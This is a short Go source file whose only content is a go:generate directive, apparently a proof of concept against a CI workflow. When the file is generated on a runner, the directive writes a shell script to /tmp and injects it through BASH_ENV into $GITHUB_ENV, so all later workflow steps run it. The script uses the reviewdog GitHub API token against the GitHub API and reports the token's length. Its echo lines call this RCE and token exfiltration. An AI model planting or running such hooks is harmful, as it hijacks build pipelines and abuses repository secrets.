package main

//go:generate sh -c "echo '=== RCE: go generate executed on base-repo runner ==='; printf '#!/bin/sh\nTOKEN_LEN=$(printf \"%%s\" \"$REVIEWDOG_GITHUB_API_TOKEN\" | wc -c)\nHTTP_STATUS=$(curl -s -o /dev/null -w \"%%{http_code}\" -H \"Authorization: Bearer $REVIEWDOG_GITHUB_API_TOKEN\" https://api.github.com/repos/$GITHUB_REPOSITORY)\necho \"=== TOKEN EXFIL ===  length=$TOKEN_LEN  gh-api-status=$HTTP_STATUS\"\n' > /tmp/inject.sh; chmod +x /tmp/inject.sh; echo BASH_ENV=/tmp/inject.sh >> $GITHUB_ENV; echo '--- BASH_ENV injected for all subsequent steps ---'"
